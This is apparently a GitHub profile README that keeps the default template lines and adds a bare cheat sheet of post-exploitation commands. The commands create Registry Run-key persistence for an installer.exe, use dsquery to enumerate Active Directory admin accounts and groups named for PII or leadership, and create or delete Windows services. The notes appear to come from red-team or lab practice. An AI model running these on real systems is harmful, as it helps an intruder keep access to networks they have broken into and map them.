- 👋 Hi, I’m @jefeattack
- 👀 I’m interested in ...
- 🌱 I’m currently learning ...
- 💞️ I’m looking to collaborate on ...
- 📫 How to reach me ...

<!---
jefeattack/jefeattack is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
You can click the Preview link to take a look at your changes.
--->

reg query "HKCU\Software\Microsoft\Windows\Currentversion\Run"

shell reg add "HKCU\Software\Microsoft\Windows\Currentversion\Run" /V "Backup" /t REG_SZ /F /D "C:\Users\alan.grant\AppData\Local\installer.exe"


shell dsquery * -filter "(&(objectclass= user)(Admincount=1))" -attr samaccountname name AdminCount limit 0

shell dsquery * -filter "(&(ObjectClass=user)(adminCount=1))" -d nyc.ershon.local -attr name saMAccountName description -limit 10

shell dsquery * -filter "(&(objectclass= computer)(operatingsystem= *in*))" -attr name samaccountname operatingsystem -limit 10

shell dsquery * -filter "(name= *PII*)" -attr samaccountname name limit 0

shell dsquery * -filter "(name= *PII*)" -attr * limit 5

shell dsquery * -filter "(name= SupervisorsManagersLeadership)" -attr * limit 5

shell dsquery * -filter "(name= *workman*)" -attr * limit 5

sc query NewServ
sc delete NewServ
sc create "myservicename" binpath= "C:\Path\to\file" displayname= "my service" start= auto
sc start "service"
